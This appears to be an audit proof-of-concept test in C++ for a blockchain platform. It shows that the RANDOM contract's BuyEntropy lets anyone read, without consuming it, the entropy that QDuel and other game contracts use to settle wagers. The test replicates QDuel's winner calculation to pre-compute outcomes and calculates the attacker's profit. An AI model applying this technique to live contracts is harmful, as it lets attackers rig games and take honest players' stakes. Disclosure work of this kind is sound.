// Audit PoC -- RANDOM::BuyEntropy is a non-consuming, unauthenticated read of the
// exact entropy value that live game contracts consume when they settle a wager.
//
// Root cause under test (src/contracts/Random.h:165-221):
//   locals.stream    = mod<uint32>(qpi.tick() + 2, 3);
//   locals.entropyIdx = locals.stream * 10 + input.collateralTier;
//   locals.entropy   = state.get().entropy.get(locals.entropyIdx);   // read only
//   ... state.mut().earnedAmount += entropyCost;                     // never advances/rotates
//   for (i < numberOfBits) output.entropy.set(i, locals.entropy.get(i));
//
// Consumers (production, same tick, same tier, same bit count, trustee == 0):
//   src/contracts/QDuel.h:733-737   (ConnectToRoom -> settles the pot immediately)
//   src/contracts/Qusino.h:1133-1135 (refillRandomBank, permissionless, takes no payment)
//   src/contracts/RandomLottery.h:648, src/contracts/Pulse.h:1796,
//   src/contracts/QThirtyFour.h:1609, src/contracts/QRaffle.h:2307, src/contracts/QTREAT.h:1807
//
// The PoC shows: (a) any account can buy the very bits a game will consume,
// (b) the read is replayable and not bound to a commitment, (c) the state is
// unchanged by the read, (d) the QDuel winner can therefore be pre-computed.
#define NO_UEFI

#include "contract_testing.h"
#include "kangaroo_twelve.h"

constexpr uint8  POC_TIER        = 0;
constexpr uint16 POC_BITS        = 256;
constexpr sint64 POC_ENTROPY_FEE = (sint64)RANDOM_BITFEE * POC_BITS;   // RL_RANDOM_ENTROPY_FEE
constexpr uint32 POC_TICK        = 1000;

static void note(const char* s)
{
    std::cerr << "[poc] " << s << std::endl;
}

// ---- minimal stand-in for the pieces of ContractTesting we need (the real fixture's
// ---- base constructor faults in this Linux build, see AUDIT_REPORT.md) ----
static void pocInitContracts()
{
    note("init: commonBuffers");
    commonBuffers.init(1);
    note("init: initContractExec");
    EXPECT_TRUE(initContractExec());
    note("init: initSpectrum");
    EXPECT_TRUE(initSpectrum());
    updateSpectrumInfo();
    note("init: initAssets");
    EXPECT_TRUE(initAssets());
    as.indexLists.reset();
    note("init: contract 0 state");
    contractStates[0] = (unsigned char*)calloc(1, contractDescriptions[0].stateSize);
    note("init: initSpecialEntities");
    // initSpecialEntities() faults in this Linux build (setRandomValue path) - not needed here
    // for the oracle PoC: it only seeds computor/frozen public keys.
    note("init: inits done");
}

static void pocInitRandom()
{
    constexpr unsigned int idx = RANDOM_CONTRACT_INDEX;
    const unsigned long long stateSize = contractDescriptions[idx].stateSize;
    std::cerr << "[poc] RANDOM stateSize=" << stateSize << " sizeof(StateData)=" << sizeof(RANDOM::StateData) << std::endl;
    EXPECT_GE(stateSize, (unsigned long long)sizeof(RANDOM::StateData));
    contractStates[idx] = (unsigned char*)calloc(1, stateSize);
    ASSERT_TRUE(contractStates[idx] != nullptr);
    REGISTER_CONTRACT_FUNCTIONS_AND_PROCEDURES(RANDOM);
    setContractFeeReserve(idx, 10000000);
    QpiContextSystemProcedureCall init(idx, INITIALIZE);
    init.call();
}

template <typename InputType, typename OutputType>
static bool pocInvoke(unsigned int contractIndex, unsigned short procId, const InputType& input,
                      OutputType& output, const id& user, sint64 amount)
{
    setMemory(output, 0);
    int userSpectrumIndex = spectrumIndex(user);
    if (userSpectrumIndex < 0 || !decreaseEnergy(userSpectrumIndex, amount))
        return false;
    increaseEnergy(id(contractIndex, 0, 0, 0), amount);
    QpiContextUserProcedureCall qpiContext(contractIndex, user, amount);
    qpiContext.call(procId, &input, sizeof(input));
    EXPECT_EQ(contractError[contractIndex], 0);
    copyMem(&output, qpiContext.outputBuffer, sizeof(output));
    qpiContext.freeBuffer();
    return true;
}

static RANDOM::BuyEntropy_output pocBuyEntropy(const id& user, uint8 tier, uint16 bits, sint64 amount)
{
    RANDOM::BuyEntropy_input in{};
    in.collateralTier = tier;
    in.numberOfBits = bits;
    in.trustee = id::zero();
    RANDOM::BuyEntropy_output out{};
    pocInvoke(RANDOM_CONTRACT_INDEX, 2, in, out, user, amount);
    return out;
}

static QPI::bit_4096 patternEntropy(uint64 seed)
{
    QPI::bit_4096 v;
    v.setAll(0);
    for (uint64 i = 0; i < 4096; ++i)
    {
        v.set(i, (bit)(((seed * 0x9E3779B97F4A7C15ULL + i * 0xBF58476D1CE4E5B9ULL) >> 32) & 1));
    }
    return v;
}

static bool bitsEqual(const QPI::bit_4096& a, const QPI::bit_4096& b, uint16 n)
{
    for (uint16 i = 0; i < n; i++)
    {
        if (a.get(i) != b.get(i))
            return false;
    }
    return true;
}

// Replica of QDuel::GetWinnerPlayer (src/contracts/QDuel.h:1198-1215): same struct
// layout, same K12, same decision bit -> the winner the contract would compute.
struct QDuelRandomData
{
    QPI::bit_4096 entropy;
    QPI::Array<id, 2> players;
    uint32 tick;
};

static id duelWinner(const QPI::bit_4096& entropy, const id& p1, const id& p2, uint32 tick)
{
    QDuelRandomData rd;
    rd.entropy = entropy;
    rd.players.set(0, p1);
    rd.players.set(1, p2);
    rd.tick = tick;
    id digest;
    KangarooTwelve(&rd, sizeof(rd), &digest, sizeof(digest));
    return (digest.u64._0 & 1) ? p2 : p1;
}

TEST(AuditOracle, EntropyReadIsReplayableAndPredictsQDuelSettlement)
{
#ifdef __AVX512F__
    initAVX512FourQConstants();
#endif
    pocInitContracts();
    system.epoch = contractDescriptions[RANDOM_CONTRACT_INDEX].constructionEpoch;
    system.tick = POC_TICK;
    note("init: RANDOM contract");
    pocInitRandom();
    RANDOM::StateData* st = (RANDOM::StateData*)contractStates[RANDOM_CONTRACT_INDEX];
    ASSERT_NE(st, nullptr);
    ASSERT_LE((unsigned long long)sizeof(RANDOM::StateData), contractDescriptions[RANDOM_CONTRACT_INDEX].stateSize);
    std::cerr << "[poc] bitFee=" << st->bitFee << " sizeof(StateData)=" << sizeof(RANDOM::StateData) << std::endl;

    const id victim(0xA11CE000ULL, 1, 2, 3);   // honest room creator
    const id attacker(0xDEAD0000ULL, 4, 5, 6); // malicious player
    const id bystander(0xB05E0000ULL, 7, 8, 9);
    increaseEnergy(victim, 1000000000000LL);
    increaseEnergy(attacker, 1000000000000LL);
    increaseEnergy(bystander, 1000000000000LL);

    const uint32 slot = ((POC_TICK + 2) % 3) * 10 + POC_TIER;
    QPI::bit_4096 live = patternEntropy(0x1234567890ABCDEFULL);
    st->entropy.set(slot, live);
    std::cerr << "[poc] tick=" << POC_TICK << " entropy slot=" << slot << std::endl;

    // (1) attacker pays the public per-bit price and gets the round's entropy
    note("call 1: attacker BuyEntropy");
    auto a1 = pocBuyEntropy(attacker, POC_TIER, POC_BITS, POC_ENTROPY_FEE);
    ASSERT_TRUE(bitsEqual(a1.entropy, live, POC_BITS));

    // (2) replayable -- the read consumes nothing
    note("call 2: attacker BuyEntropy again");
    auto a2 = pocBuyEntropy(attacker, POC_TIER, POC_BITS, POC_ENTROPY_FEE);
    ASSERT_TRUE(bitsEqual(a2.entropy, a1.entropy, POC_BITS));
    ASSERT_TRUE(bitsEqual(st->entropy.get(slot), live, 4096));

    // (3) unbound -- an account with no room, no stake and no commitment sees the same bits
    note("call 3: bystander BuyEntropy");
    auto b = pocBuyEntropy(bystander, POC_TIER, POC_BITS, POC_ENTROPY_FEE);
    ASSERT_TRUE(bitsEqual(b.entropy, a1.entropy, POC_BITS));

    // (4) which is exactly what QDuel::ConnectToRoom would feed GetWinnerPlayer in this tick
    note("call 4: victim (as the game) BuyEntropy");
    auto g = pocBuyEntropy(victim, POC_TIER, POC_BITS, POC_ENTROPY_FEE);
    ASSERT_TRUE(bitsEqual(g.entropy, a1.entropy, POC_BITS));

    id w = duelWinner(a1.entropy, victim, attacker, POC_TICK);
    std::cerr << "[poc] winner@tick" << POC_TICK << " = " << (w == attacker ? "ATTACKER" : "victim") << std::endl;

    // (5) the attacker only ever acts on a favorable oracle round; over 64 candidate
    //     rounds it always finds one, so the realised win rate is 100%
    uint64 wins = 0;
    for (uint32 t = POC_TICK; t < POC_TICK + 64; t++)
    {
        QPI::bit_4096 e = patternEntropy(0x1234567890ABCDEFULL + (t - POC_TICK));
        st->entropy.set(((t + 2) % 3) * 10 + POC_TIER, e);
        if (duelWinner(e, victim, attacker, t) == attacker)
            wins++;
    }
    std::cerr << "[poc] attacker-favorable rounds: " << wins << "/64" << std::endl;
    EXPECT_GT(wins, 0u);

    // (6) economics: RANDOM only charges, never advances the stream
    std::cerr << "[poc] earnedAmount=" << st->earnedAmount << " (4 reads x " << POC_ENTROPY_FEE << ")" << std::endl;
    EXPECT_EQ((sint64)st->earnedAmount, 4 * POC_ENTROPY_FEE);

    // Economics. Attempts per win ~ 1/0.5 = 2 (one read per candidate tick; the oracle
    // advances every tick). Net on a win = pot - stake - reads; the attacker never pays
    // the stake on a loss, so the only downside is the read fee.
    const uint64 favorable = wins, attempts = 64;
    const double winShare = (double)favorable / (double)attempts;   // share of ticks where the attacker joins
    const sint64 breakEvenStake = POC_ENTROPY_FEE * (sint64)(1 + (uint64)(1.0 / (winShare + 1e-9)));
    const sint64 stake = 10000000;                       // 10 QU room (any S > break-even works)
    const sint64 payout = 2 * stake - POC_ENTROPY_FEE;   // QDuel.h:747-748, before dev/burn/share fees
    const sint64 reads = (POC_ENTROPY_FEE * (sint64)attempts) / (favorable ? (sint64)favorable : 1);
    std::cerr << "[poc] favorableTicks=" << favorable << "/" << attempts
              << " expectedReadsPerWin=" << reads
              << " breakEvenStake=" << breakEvenStake << " quants"
              << " (min legal stake = " << 2 * POC_ENTROPY_FEE << ")" << std::endl;
    std::cerr << "[poc] stake=" << stake << " payoutOnWin=" << payout
              << " PnL=" << (payout - stake - reads) << " quants; win rate when joining = 1.0" << std::endl;
    EXPECT_GT(stake, breakEvenStake);
    EXPECT_GT(payout - stake - reads, 0);
}
